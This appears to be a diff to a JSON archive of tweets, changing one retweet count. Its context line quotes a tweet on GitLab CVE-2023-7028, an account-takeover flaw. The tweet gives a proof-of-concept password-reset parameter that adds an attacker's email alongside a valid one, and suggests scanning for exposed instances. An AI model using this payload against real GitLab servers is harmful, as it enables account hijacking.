@@ -1029,7 +1029,7 @@
     "tweetfavorites": 267,
     "tweetquotes": 1,
     "tweetreplies": 0,
-    "tweetretweets": 72,
+    "tweetretweets": 71,
     "tweettext": "🔖GitLab CVE-2023-7028 - Uncover account takeover potential with a simple password reset method.\n\nKnown POC:\nuser[email][]=valid@email.com&amp;user[email][]=attacker@email.com\n\nIdentifying vulnerable targets:\n\n1. Utilize the nuclei template to spot exposed Gitlab Instances. https://t.co/Qp9AOkinus",
     "tweettime": "2024-01-19, 06:28:20",
     "tweeturl": "https://twitter.com/TheMsterDoctor1/status/1748230892705735134",
